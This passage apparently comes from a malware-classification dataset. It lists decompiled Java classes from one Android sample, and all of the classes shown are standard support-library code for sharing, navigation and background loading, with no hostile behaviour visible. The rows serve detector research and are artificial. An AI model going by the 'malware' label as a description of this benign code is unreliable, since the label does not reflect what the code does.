"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\SetIndicatorInfo.code","private static class SetIndicatorInfo {   public Method setHomeActionContentDescription;   public Method setHomeAsUpIndicator;   public ImageView upIndicatorView;   SetIndicatorInfo(  Activity activity){     try {       this.setHomeAsUpIndicator=ActionBar.class.getDeclaredMethod(""setHomeAsUpIndicator"",Drawable.class);       this.setHomeActionContentDescription=ActionBar.class.getDeclaredMethod(""setHomeActionContentDescription"",Integer.TYPE);     }  catch (    NoSuchMethodException e) {       View home=activity.findViewById(R.id.home);       if (home != null) {         ViewGroup parent=(ViewGroup)home.getParent();         int childCount=parent.getChildCount();         if (childCount == 2) {           View first=parent.getChildAt(0);           View second=parent.getChildAt(1);           View up=first.getId() == 16908332 ? second : first;           if (up instanceof ImageView) {             this.upIndicatorView=(ImageView)up;           }         }       }     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\ShareCompat.code","public class ShareCompat {   public static final String EXTRA_CALLING_ACTIVITY=""android.support.v4.app.EXTRA_CALLING_ACTIVITY"";   public static final String EXTRA_CALLING_PACKAGE=""android.support.v4.app.EXTRA_CALLING_PACKAGE"";   private static ShareCompatImpl IMPL; public interface ShareCompatImpl {     void configureMenuItem(    MenuItem menuItem,    IntentBuilder intentBuilder);     String escapeHtml(    CharSequence charSequence);   } static class ShareCompatImplBase implements ShareCompatImpl {     ShareCompatImplBase(){     }     @Override public void configureMenuItem(    MenuItem item,    IntentBuilder shareIntent){       item.setIntent(shareIntent.createChooserIntent());     }     @Override public String escapeHtml(    CharSequence text){       StringBuilder out=new StringBuilder();       withinStyle(out,text,0,text.length());       return out.toString();     }     private static void withinStyle(    StringBuilder out,    CharSequence text,    int start,    int end){       int i=start;       while (i < end) {         char c=text.charAt(i);         if (c == '<') {           out.append(""&lt;"");         }  else         if (c == '>') {           out.append(""&gt;"");         }  else         if (c == '&') {           out.append(""&amp;"");         }  else         if (c > '~' || c < ' ') {           out.append(""&#"" + ((int)c) + "";"");         }  else         if (c == ' ') {           while (i + 1 < end && text.charAt(i + 1) == ' ') {             out.append(""&nbsp;"");             i++;           }           out.append(' ');         }  else {           out.append(c);         }         i++;       }     }   } static class ShareCompatImplICS extends ShareCompatImplBase {     ShareCompatImplICS(){     }     @Override public void configureMenuItem(    MenuItem item,    IntentBuilder shareIntent){       ShareCompatICS.configureMenuItem(item,shareIntent.getActivity(),shareIntent.getIntent());       if (shouldAddChooserIntent(item)) {         item.setIntent(shareIntent.createChooserIntent());       }     }     boolean shouldAddChooserIntent(    MenuItem item){       return !item.hasSubMenu();     }   } static class ShareCompatImplJB extends ShareCompatImplICS {     ShareCompatImplJB(){     }     @Override public String escapeHtml(    CharSequence html){       return ShareCompatJB.escapeHtml(html);     }     @Override boolean shouldAddChooserIntent(    MenuItem item){       return false;     }   } static {     if (Build.VERSION.SDK_INT >= 16) {       IMPL=new ShareCompatImplJB();     }  else     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new ShareCompatImplICS();     }  else {       IMPL=new ShareCompatImplBase();     }   }   public static String getCallingPackage(  Activity calledActivity){     String result=calledActivity.getCallingPackage();     if (result == null) {       return calledActivity.getIntent().getStringExtra(EXTRA_CALLING_PACKAGE);     }     return result;   }   public static ComponentName getCallingActivity(  Activity calledActivity){     ComponentName result=calledActivity.getCallingActivity();     if (result == null) {       return (ComponentName)calledActivity.getIntent().getParcelableExtra(EXTRA_CALLING_ACTIVITY);     }     return result;   }   public static void configureMenuItem(  MenuItem item,  IntentBuilder shareIntent){     IMPL.configureMenuItem(item,shareIntent);   }   public static void configureMenuItem(  Menu menu,  int menuItemId,  IntentBuilder shareIntent){     MenuItem item=menu.findItem(menuItemId);     if (item == null) {       throw new IllegalArgumentException(""Could not find menu item with id "" + menuItemId + "" in the supplied menu"");     }     configureMenuItem(item,shareIntent);   } public static class IntentBuilder {     private Activity mActivity;     private ArrayList<String> mBccAddresses;     private ArrayList<String> mCcAddresses;     private CharSequence mChooserTitle;     private Intent mIntent=new Intent().setAction(""android.intent.action.SEND"");     private ArrayList<Uri> mStreams;     private ArrayList<String> mToAddresses;     public static IntentBuilder from(    Activity launchingActivity){       return new IntentBuilder(launchingActivity);     }     private IntentBuilder(    Activity launchingActivity){       this.mActivity=launchingActivity;       this.mIntent.putExtra(ShareCompat.EXTRA_CALLING_PACKAGE,launchingActivity.getPackageName());       this.mIntent.putExtra(ShareCompat.EXTRA_CALLING_ACTIVITY,launchingActivity.getComponentName());       this.mIntent.addFlags(AccessibilityEventCompat.TYPE_GESTURE_DETECTION_END);     }     public Intent getIntent(){       if (this.mToAddresses != null) {         combineArrayExtra(""android.intent.extra.EMAIL"",this.mToAddresses);         this.mToAddresses=null;       }       if (this.mCcAddresses != null) {         combineArrayExtra(""android.intent.extra.CC"",this.mCcAddresses);         this.mCcAddresses=null;       }       if (this.mBccAddresses != null) {         combineArrayExtra(""android.intent.extra.BCC"",this.mBccAddresses);         this.mBccAddresses=null;       }       boolean needsSendMultiple=this.mStreams != null && this.mStreams.size() > 1;       boolean isSendMultiple=this.mIntent.getAction().equals(""android.intent.action.SEND_MULTIPLE"");       if (!needsSendMultiple && isSendMultiple) {         this.mIntent.setAction(""android.intent.action.SEND"");         if (this.mStreams != null && !this.mStreams.isEmpty()) {           this.mIntent.putExtra(""android.intent.extra.STREAM"",this.mStreams.get(0));         }  else {           this.mIntent.removeExtra(""android.intent.extra.STREAM"");         }         this.mStreams=null;       }       if (needsSendMultiple && !isSendMultiple) {         this.mIntent.setAction(""android.intent.action.SEND_MULTIPLE"");         if (this.mStreams != null && !this.mStreams.isEmpty()) {           this.mIntent.putParcelableArrayListExtra(""android.intent.extra.STREAM"",this.mStreams);         }  else {           this.mIntent.removeExtra(""android.intent.extra.STREAM"");         }       }       return this.mIntent;     }     Activity getActivity(){       return this.mActivity;     }     private void combineArrayExtra(    String extra,    ArrayList<String> add){       String[] currentAddresses=this.mIntent.getStringArrayExtra(extra);       int currentLength=currentAddresses != null ? currentAddresses.length : 0;       String[] finalAddresses=new String[add.size() + currentLength];       add.toArray(finalAddresses);       if (currentAddresses != null) {         System.arraycopy(currentAddresses,0,finalAddresses,add.size(),currentLength);       }       this.mIntent.putExtra(extra,finalAddresses);     }     private void combineArrayExtra(    String extra,    String[] add){       Intent intent=getIntent();       String[] old=intent.getStringArrayExtra(extra);       int oldLength=old != null ? old.length : 0;       String[] result=new String[add.length + oldLength];       if (old != null) {         System.arraycopy(old,0,result,0,oldLength);       }       System.arraycopy(add,0,result,oldLength,add.length);       intent.putExtra(extra,result);     }     public Intent createChooserIntent(){       return Intent.createChooser(getIntent(),this.mChooserTitle);     }     public void startChooser(){       this.mActivity.startActivity(createChooserIntent());     }     public IntentBuilder setChooserTitle(    CharSequence title){       this.mChooserTitle=title;       return this;     }     public IntentBuilder setChooserTitle(    int resId){       return setChooserTitle(this.mActivity.getText(resId));     }     public IntentBuilder setType(    String mimeType){       this.mIntent.setType(mimeType);       return this;     }     public IntentBuilder setText(    CharSequence text){       this.mIntent.putExtra(""android.intent.extra.TEXT"",text);       return this;     }     public IntentBuilder setHtmlText(    String htmlText){       this.mIntent.putExtra(IntentCompat.EXTRA_HTML_TEXT,htmlText);       if (!this.mIntent.hasExtra(""android.intent.extra.TEXT"")) {         setText(Html.fromHtml(htmlText));       }       return this;     }     public IntentBuilder setStream(    Uri streamUri){       if (!this.mIntent.getAction().equals(""android.intent.action.SEND"")) {         this.mIntent.setAction(""android.intent.action.SEND"");       }       this.mStreams=null;       this.mIntent.putExtra(""android.intent.extra.STREAM"",streamUri);       return this;     }     public IntentBuilder addStream(    Uri streamUri){       Uri currentStream=(Uri)this.mIntent.getParcelableExtra(""android.intent.extra.STREAM"");       if (currentStream == null) {         return setStream(streamUri);       }       if (this.mStreams == null) {         this.mStreams=new ArrayList<>();       }       if (currentStream != null) {         this.mIntent.removeExtra(""android.intent.extra.STREAM"");         this.mStreams.add(currentStream);       }       this.mStreams.add(streamUri);       return this;     }     public IntentBuilder setEmailTo(    String[] addresses){       if (this.mToAddresses != null) {         this.mToAddresses=null;       }       this.mIntent.putExtra(""android.intent.extra.EMAIL"",addresses);       return this;     }     public IntentBuilder addEmailTo(    String address){       if (this.mToAddresses == null) {         this.mToAddresses=new ArrayList<>();       }       this.mToAddresses.add(address);       return this;     }     public IntentBuilder addEmailTo(    String[] addresses){       combineArrayExtra(""android.intent.extra.EMAIL"",addresses);       return this;     }     public IntentBuilder setEmailCc(    String[] addresses){       this.mIntent.putExtra(""android.intent.extra.CC"",addresses);       return this;     }     public IntentBuilder addEmailCc(    String address){       if (this.mCcAddresses == null) {         this.mCcAddresses=new ArrayList<>();       }       this.mCcAddresses.add(address);       return this;     }     public IntentBuilder addEmailCc(    String[] addresses){       combineArrayExtra(""android.intent.extra.CC"",addresses);       return this;     }     public IntentBuilder setEmailBcc(    String[] addresses){       this.mIntent.putExtra(""android.intent.extra.BCC"",addresses);       return this;     }     public IntentBuilder addEmailBcc(    String address){       if (this.mBccAddresses == null) {         this.mBccAddresses=new ArrayList<>();       }       this.mBccAddresses.add(address);       return this;     }     public IntentBuilder addEmailBcc(    String[] addresses){       combineArrayExtra(""android.intent.extra.BCC"",addresses);       return this;     }     public IntentBuilder setSubject(    String subject){       this.mIntent.putExtra(""android.intent.extra.SUBJECT"",subject);       return this;     }   } public static class IntentReader {     private static final String TAG=""IntentReader"";     private Activity mActivity;     private ComponentName mCallingActivity;     private String mCallingPackage;     private Intent mIntent;     private ArrayList<Uri> mStreams;     public static IntentReader from(    Activity activity){       return new IntentReader(activity);     }     private IntentReader(    Activity activity){       this.mActivity=activity;       this.mIntent=activity.getIntent();       this.mCallingPackage=ShareCompat.getCallingPackage(activity);       this.mCallingActivity=ShareCompat.getCallingActivity(activity);     }     public boolean isShareIntent(){       String action=this.mIntent.getAction();       return ""android.intent.action.SEND"".equals(action) || ""android.intent.action.SEND_MULTIPLE"".equals(action);     }     public boolean isSingleShare(){       return ""android.intent.action.SEND"".equals(this.mIntent.getAction());     }     public boolean isMultipleShare(){       return ""android.intent.action.SEND_MULTIPLE"".equals(this.mIntent.getAction());     }     public String getType(){       return this.mIntent.getType();     }     public CharSequence getText(){       return this.mIntent.getCharSequenceExtra(""android.intent.extra.TEXT"");     }     public String getHtmlText(){       String result=this.mIntent.getStringExtra(IntentCompat.EXTRA_HTML_TEXT);       if (result == null) {         CharSequence text=getText();         if (text instanceof Spanned) {           return Html.toHtml((Spanned)text);         }         if (text != null) {           return ShareCompat.IMPL.escapeHtml(text);         }         return result;       }       return result;     }     public Uri getStream(){       return (Uri)this.mIntent.getParcelableExtra(""android.intent.extra.STREAM"");     }     public Uri getStream(    int index){       if (this.mStreams == null && isMultipleShare()) {         this.mStreams=this.mIntent.getParcelableArrayListExtra(""android.intent.extra.STREAM"");       }       if (this.mStreams != null) {         return this.mStreams.get(index);       }       if (index == 0) {         return (Uri)this.mIntent.getParcelableExtra(""android.intent.extra.STREAM"");       }       throw new IndexOutOfBoundsException(""Stream items available: "" + getStreamCount() + "" index requested: ""+ index);     }     public int getStreamCount(){       if (this.mStreams == null && isMultipleShare()) {         this.mStreams=this.mIntent.getParcelableArrayListExtra(""android.intent.extra.STREAM"");       }       if (this.mStreams != null) {         return this.mStreams.size();       }       return this.mIntent.hasExtra(""android.intent.extra.STREAM"") ? 1 : 0;     }     public String[] getEmailTo(){       return this.mIntent.getStringArrayExtra(""android.intent.extra.EMAIL"");     }     public String[] getEmailCc(){       return this.mIntent.getStringArrayExtra(""android.intent.extra.CC"");     }     public String[] getEmailBcc(){       return this.mIntent.getStringArrayExtra(""android.intent.extra.BCC"");     }     public String getSubject(){       return this.mIntent.getStringExtra(""android.intent.extra.SUBJECT"");     }     public String getCallingPackage(){       return this.mCallingPackage;     }     public ComponentName getCallingActivity(){       return this.mCallingActivity;     }     public Drawable getCallingActivityIcon(){       if (this.mCallingActivity == null) {         return null;       }       PackageManager pm=this.mActivity.getPackageManager();       try {         return pm.getActivityIcon(this.mCallingActivity);       }  catch (      PackageManager.NameNotFoundException e) {         Log.e(TAG,""Could not retrieve icon for calling activity"",e);         return null;       }     }     public Drawable getCallingApplicationIcon(){       if (this.mCallingPackage == null) {         return null;       }       PackageManager pm=this.mActivity.getPackageManager();       try {         return pm.getApplicationIcon(this.mCallingPackage);       }  catch (      PackageManager.NameNotFoundException e) {         Log.e(TAG,""Could not retrieve icon for calling application"",e);         return null;       }     }     public CharSequence getCallingApplicationLabel(){       if (this.mCallingPackage == null) {         return null;       }       PackageManager pm=this.mActivity.getPackageManager();       try {         return pm.getApplicationLabel(pm.getApplicationInfo(this.mCallingPackage,0));       }  catch (      PackageManager.NameNotFoundException e) {         Log.e(TAG,""Could not retrieve label for calling application"",e);         return null;       }     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\ShareCompatICS.code","class ShareCompatICS {   private static final String HISTORY_FILENAME_PREFIX="".sharecompat_"";   ShareCompatICS(){   }   public static void configureMenuItem(  MenuItem item,  Activity callingActivity,  Intent intent){     ShareActionProvider provider;     ActionProvider itemProvider=item.getActionProvider();     if (!(itemProvider instanceof ShareActionProvider)) {       provider=new ShareActionProvider(callingActivity);     }  else {       provider=(ShareActionProvider)itemProvider;     }     provider.setShareHistoryFileName(HISTORY_FILENAME_PREFIX + callingActivity.getClass().getName());     provider.setShareIntent(intent);     item.setActionProvider(provider);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\ShareCompatImpl.code","public interface ShareCompatImpl {   void configureMenuItem(  MenuItem menuItem,  IntentBuilder intentBuilder);   String escapeHtml(  CharSequence charSequence); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\ShareCompatImplBase.code","static class ShareCompatImplBase implements ShareCompatImpl {   ShareCompatImplBase(){   }   @Override public void configureMenuItem(  MenuItem item,  IntentBuilder shareIntent){     item.setIntent(shareIntent.createChooserIntent());   }   @Override public String escapeHtml(  CharSequence text){     StringBuilder out=new StringBuilder();     withinStyle(out,text,0,text.length());     return out.toString();   }   private static void withinStyle(  StringBuilder out,  CharSequence text,  int start,  int end){     int i=start;     while (i < end) {       char c=text.charAt(i);       if (c == '<') {         out.append(""&lt;"");       }  else       if (c == '>') {         out.append(""&gt;"");       }  else       if (c == '&') {         out.append(""&amp;"");       }  else       if (c > '~' || c < ' ') {         out.append(""&#"" + ((int)c) + "";"");       }  else       if (c == ' ') {         while (i + 1 < end && text.charAt(i + 1) == ' ') {           out.append(""&nbsp;"");           i++;         }         out.append(' ');       }  else {         out.append(c);       }       i++;     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\ShareCompatImplICS.code","static class ShareCompatImplICS extends ShareCompatImplBase {   ShareCompatImplICS(){   }   @Override public void configureMenuItem(  MenuItem item,  IntentBuilder shareIntent){     ShareCompatICS.configureMenuItem(item,shareIntent.getActivity(),shareIntent.getIntent());     if (shouldAddChooserIntent(item)) {       item.setIntent(shareIntent.createChooserIntent());     }   }   boolean shouldAddChooserIntent(  MenuItem item){     return !item.hasSubMenu();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\ShareCompatImplJB.code","static class ShareCompatImplJB extends ShareCompatImplICS {   ShareCompatImplJB(){   }   @Override public String escapeHtml(  CharSequence html){     return ShareCompatJB.escapeHtml(html);   }   @Override boolean shouldAddChooserIntent(  MenuItem item){     return false;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\ShareCompatJB.code","class ShareCompatJB {   ShareCompatJB(){   }   public static String escapeHtml(  CharSequence html){     return Html.escapeHtml(html);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\SlideDrawable.code","public class SlideDrawable extends LevelListDrawable implements Drawable.Callback {   private final boolean mHasMirroring;   private float mOffset;   private float mPosition;   private final Rect mTmpRect;   private SlideDrawable(  Drawable wrapped){     this.mHasMirroring=Build.VERSION.SDK_INT > 18;     this.mTmpRect=new Rect();     if (DrawableCompat.isAutoMirrored(wrapped)) {       DrawableCompat.setAutoMirrored(this,true);     }     addLevel(0,0,wrapped);   }   public void setPosition(  float position){     this.mPosition=position;     invalidateSelf();   }   public float getPosition(){     return this.mPosition;   }   public void setOffset(  float offset){     this.mOffset=offset;     invalidateSelf();   }   @Override public void draw(  Canvas canvas){     copyBounds(this.mTmpRect);     canvas.save();     boolean isLayoutRTL=ViewCompat.getLayoutDirection(ActionBarDrawerToggle.this.mActivity.getWindow().getDecorView()) == 1;     int flipRtl=isLayoutRTL ? -1 : 1;     int width=this.mTmpRect.width();     canvas.translate((-this.mOffset) * width * this.mPosition* flipRtl,0.0f);     if (isLayoutRTL && !this.mHasMirroring) {       canvas.translate(width,0.0f);       canvas.scale(-1.0f,1.0f);     }     super.draw(canvas);     canvas.restore();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\Style.code","public static abstract class Style {   CharSequence mBigContentTitle;   Builder mBuilder;   CharSequence mSummaryText;   boolean mSummaryTextSet=false;   public void setBuilder(  Builder builder){     if (this.mBuilder != builder) {       this.mBuilder=builder;       if (this.mBuilder != null) {         this.mBuilder.setStyle(this);       }     }   }   public Notification build(){     if (this.mBuilder == null) {       return null;     }     Notification notification=this.mBuilder.build();     return notification;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\SuperNotCalledException.code","final class SuperNotCalledException extends AndroidRuntimeException {   public SuperNotCalledException(  String msg){     super(msg);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\SupportParentable.code","public interface SupportParentable {   Intent getSupportParentActivityIntent(); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\TabInfo.code","public static final class TabInfo {   private final Bundle args;   private final Class<?> clss;   private Fragment fragment;   private final String tag;   TabInfo(  String _tag,  Class<?> _class,  Bundle _args){     this.tag=_tag;     this.clss=_class;     this.args=_args;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\TaskStackBuilder.code","public class TaskStackBuilder implements Iterable<Intent> {   private static final TaskStackBuilderImpl IMPL;   private static final String TAG=""TaskStackBuilder"";   private final ArrayList<Intent> mIntents=new ArrayList<>();   private final Context mSourceContext; public interface SupportParentable {     Intent getSupportParentActivityIntent();   } public interface TaskStackBuilderImpl {     PendingIntent getPendingIntent(    Context context,    Intent[] intentArr,    int i,    int i2,    Bundle bundle);   } static class TaskStackBuilderImplBase implements TaskStackBuilderImpl {     TaskStackBuilderImplBase(){     }     @Override public PendingIntent getPendingIntent(    Context context,    Intent[] intents,    int requestCode,    int flags,    Bundle options){       Intent topIntent=new Intent(intents[intents.length - 1]);       topIntent.addFlags(268435456);       return PendingIntent.getActivity(context,requestCode,topIntent,flags);     }   } static class TaskStackBuilderImplHoneycomb implements TaskStackBuilderImpl {     TaskStackBuilderImplHoneycomb(){     }     @Override public PendingIntent getPendingIntent(    Context context,    Intent[] intents,    int requestCode,    int flags,    Bundle options){       intents[0]=new Intent(intents[0]).addFlags(268484608);       return TaskStackBuilderHoneycomb.getActivitiesPendingIntent(context,requestCode,intents,flags);     }   } static class TaskStackBuilderImplJellybean implements TaskStackBuilderImpl {     TaskStackBuilderImplJellybean(){     }     @Override public PendingIntent getPendingIntent(    Context context,    Intent[] intents,    int requestCode,    int flags,    Bundle options){       intents[0]=new Intent(intents[0]).addFlags(268484608);       return TaskStackBuilderJellybean.getActivitiesPendingIntent(context,requestCode,intents,flags,options);     }   } static {     if (Build.VERSION.SDK_INT >= 11) {       IMPL=new TaskStackBuilderImplHoneycomb();     }  else {       IMPL=new TaskStackBuilderImplBase();     }   }   private TaskStackBuilder(  Context a){     this.mSourceContext=a;   }   public static TaskStackBuilder create(  Context context){     return new TaskStackBuilder(context);   }   public static TaskStackBuilder from(  Context context){     return create(context);   }   public TaskStackBuilder addNextIntent(  Intent nextIntent){     this.mIntents.add(nextIntent);     return this;   }   public TaskStackBuilder addNextIntentWithParentStack(  Intent nextIntent){     ComponentName target=nextIntent.getComponent();     if (target == null) {       target=nextIntent.resolveActivity(this.mSourceContext.getPackageManager());     }     if (target != null) {       addParentStack(target);     }     addNextIntent(nextIntent);     return this;   }   public TaskStackBuilder addParentStack(  Activity activity){     Intent parent=null;     if (activity instanceof SupportParentable) {       parent=((SupportParentable)activity).getSupportParentActivityIntent();     }     if (parent == null) {       parent=NavUtils.getParentActivityIntent(activity);     }     if (parent != null) {       ComponentName target=parent.getComponent();       if (target == null) {         target=parent.resolveActivity(this.mSourceContext.getPackageManager());       }       addParentStack(target);       addNextIntent(parent);     }     return this;   }   public TaskStackBuilder addParentStack(  Class<?> sourceActivityClass){     return addParentStack(new ComponentName(this.mSourceContext,sourceActivityClass));   }   public TaskStackBuilder addParentStack(  ComponentName sourceActivityName){     int insertAt=this.mIntents.size();     try {       Intent parent=NavUtils.getParentActivityIntent(this.mSourceContext,sourceActivityName);       while (parent != null) {         this.mIntents.add(insertAt,parent);         parent=NavUtils.getParentActivityIntent(this.mSourceContext,parent.getComponent());       }       return this;     }  catch (    PackageManager.NameNotFoundException e) {       Log.e(TAG,""Bad ComponentName while traversing activity parent metadata"");       throw new IllegalArgumentException(e);     }   }   public int getIntentCount(){     return this.mIntents.size();   }   public Intent getIntent(  int index){     return editIntentAt(index);   }   public Intent editIntentAt(  int index){     return this.mIntents.get(index);   }   @Override public Iterator<Intent> iterator(){     return this.mIntents.iterator();   }   public void startActivities(){     startActivities(null);   }   public void startActivities(  Bundle options){     if (this.mIntents.isEmpty()) {       throw new IllegalStateException(""No intents added to TaskStackBuilder; cannot startActivities"");     }     Intent[] intents=(Intent[])this.mIntents.toArray(new Intent[this.mIntents.size()]);     intents[0]=new Intent(intents[0]).addFlags(268484608);     if (!ContextCompat.startActivities(this.mSourceContext,intents,options)) {       Intent topIntent=new Intent(intents[intents.length - 1]);       topIntent.addFlags(268435456);       this.mSourceContext.startActivity(topIntent);     }   }   public PendingIntent getPendingIntent(  int requestCode,  int flags){     return getPendingIntent(requestCode,flags,null);   }   public PendingIntent getPendingIntent(  int requestCode,  int flags,  Bundle options){     if (this.mIntents.isEmpty()) {       throw new IllegalStateException(""No intents added to TaskStackBuilder; cannot getPendingIntent"");     }     Intent[] intents=(Intent[])this.mIntents.toArray(new Intent[this.mIntents.size()]);     intents[0]=new Intent(intents[0]).addFlags(268484608);     return IMPL.getPendingIntent(this.mSourceContext,intents,requestCode,flags,options);   }   public Intent[] getIntents(){     Intent[] intents=new Intent[this.mIntents.size()];     if (intents.length != 0) {       intents[0]=new Intent(this.mIntents.get(0)).addFlags(268484608);       for (int i=1; i < intents.length; i++) {         intents[i]=new Intent(this.mIntents.get(i));       }     }     return intents;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\TaskStackBuilderHoneycomb.code","class TaskStackBuilderHoneycomb {   TaskStackBuilderHoneycomb(){   }   public static PendingIntent getActivitiesPendingIntent(  Context context,  int requestCode,  Intent[] intents,  int flags){     return PendingIntent.getActivities(context,requestCode,intents,flags);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\TaskStackBuilderImpl.code","public interface TaskStackBuilderImpl {   PendingIntent getPendingIntent(  Context context,  Intent[] intentArr,  int i,  int i2,  Bundle bundle); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\TaskStackBuilderImplBase.code","static class TaskStackBuilderImplBase implements TaskStackBuilderImpl {   TaskStackBuilderImplBase(){   }   @Override public PendingIntent getPendingIntent(  Context context,  Intent[] intents,  int requestCode,  int flags,  Bundle options){     Intent topIntent=new Intent(intents[intents.length - 1]);     topIntent.addFlags(268435456);     return PendingIntent.getActivity(context,requestCode,topIntent,flags);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\TaskStackBuilderImplHoneycomb.code","static class TaskStackBuilderImplHoneycomb implements TaskStackBuilderImpl {   TaskStackBuilderImplHoneycomb(){   }   @Override public PendingIntent getPendingIntent(  Context context,  Intent[] intents,  int requestCode,  int flags,  Bundle options){     intents[0]=new Intent(intents[0]).addFlags(268484608);     return TaskStackBuilderHoneycomb.getActivitiesPendingIntent(context,requestCode,intents,flags);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\TaskStackBuilderImplJellybean.code","static class TaskStackBuilderImplJellybean implements TaskStackBuilderImpl {   TaskStackBuilderImplJellybean(){   }   @Override public PendingIntent getPendingIntent(  Context context,  Intent[] intents,  int requestCode,  int flags,  Bundle options){     intents[0]=new Intent(intents[0]).addFlags(268484608);     return TaskStackBuilderJellybean.getActivitiesPendingIntent(context,requestCode,intents,flags,options);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\TaskStackBuilderJellybean.code","class TaskStackBuilderJellybean {   TaskStackBuilderJellybean(){   }   public static PendingIntent getActivitiesPendingIntent(  Context context,  int requestCode,  Intent[] intents,  int flags,  Bundle options){     return PendingIntent.getActivities(context,requestCode,intents,flags,options);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.content\AsyncTaskLoader.code","public abstract class AsyncTaskLoader<D> extends Loader<D> {   static final boolean DEBUG=false;   static final String TAG=""AsyncTaskLoader"";   volatile AsyncTaskLoader<D>.LoadTask mCancellingTask;   Handler mHandler;   long mLastLoadCompleteTime;   volatile AsyncTaskLoader<D>.LoadTask mTask;   long mUpdateThrottle;   public abstract D loadInBackground(); public final class LoadTask extends ModernAsyncTask<Void,Void,D> implements Runnable {     private CountDownLatch done=new CountDownLatch(1);     D result;     boolean waiting;     LoadTask(){     }     @Override public D doInBackground(    Void... voidArr){       this.result=(D)AsyncTaskLoader.this.onLoadInBackground();       return this.result;     }     @Override protected void onPostExecute(    D data){       try {         AsyncTaskLoader.this.dispatchOnLoadComplete(this,data);       }   finally {         this.done.countDown();       }     }     @Override protected void onCancelled(){       try {         AsyncTaskLoader.this.dispatchOnCancelled(this,this.result);       }   finally {         this.done.countDown();       }     }     @Override public void run(){       this.waiting=AsyncTaskLoader.DEBUG;       AsyncTaskLoader.this.executePendingTask();     }   }   public AsyncTaskLoader(  Context context){     super(context);     this.mLastLoadCompleteTime=-10000L;   }   public void setUpdateThrottle(  long delayMS){     this.mUpdateThrottle=delayMS;     if (delayMS != 0) {       this.mHandler=new Handler();     }   }   @Override public void onForceLoad(){     super.onForceLoad();     cancelLoad();     this.mTask=new LoadTask();     executePendingTask();   }   public boolean cancelLoad(){     boolean cancelled=DEBUG;     if (this.mTask != null) {       if (this.mCancellingTask != null) {         if (this.mTask.waiting) {           this.mTask.waiting=DEBUG;           this.mHandler.removeCallbacks(this.mTask);         }         this.mTask=null;       }  else       if (this.mTask.waiting) {         this.mTask.waiting=DEBUG;         this.mHandler.removeCallbacks(this.mTask);         this.mTask=null;       }  else {         cancelled=this.mTask.cancel(DEBUG);         if (cancelled) {           this.mCancellingTask=this.mTask;         }         this.mTask=null;       }     }     return cancelled;   }   public void onCanceled(  D data){   }   void executePendingTask(){     if (this.mCancellingTask == null && this.mTask != null) {       if (this.mTask.waiting) {         this.mTask.waiting=DEBUG;         this.mHandler.removeCallbacks(this.mTask);       }       if (this.mUpdateThrottle > 0) {         long now=SystemClock.uptimeMillis();         if (now < this.mLastLoadCompleteTime + this.mUpdateThrottle) {           this.mTask.waiting=true;           this.mHandler.postAtTime(this.mTask,this.mLastLoadCompleteTime + this.mUpdateThrottle);           return;         }       }       this.mTask.executeOnExecutor(ModernAsyncTask.THREAD_POOL_EXECUTOR,(Void[])null);     }   }   void dispatchOnCancelled(  AsyncTaskLoader<D>.LoadTask task,  D data){     onCanceled(data);     if (this.mCancellingTask == task) {       rollbackContentChanged();       this.mLastLoadCompleteTime=SystemClock.uptimeMillis();       this.mCancellingTask=null;       executePendingTask();     }   }   void dispatchOnLoadComplete(  AsyncTaskLoader<D>.LoadTask task,  D data){     if (this.mTask != task) {       dispatchOnCancelled(task,data);       return;     }     if (isAbandoned()) {       onCanceled(data);       return;     }     commitContentChanged();     this.mLastLoadCompleteTime=SystemClock.uptimeMillis();     this.mTask=null;     deliverResult(data);   }   protected D onLoadInBackground(){     return 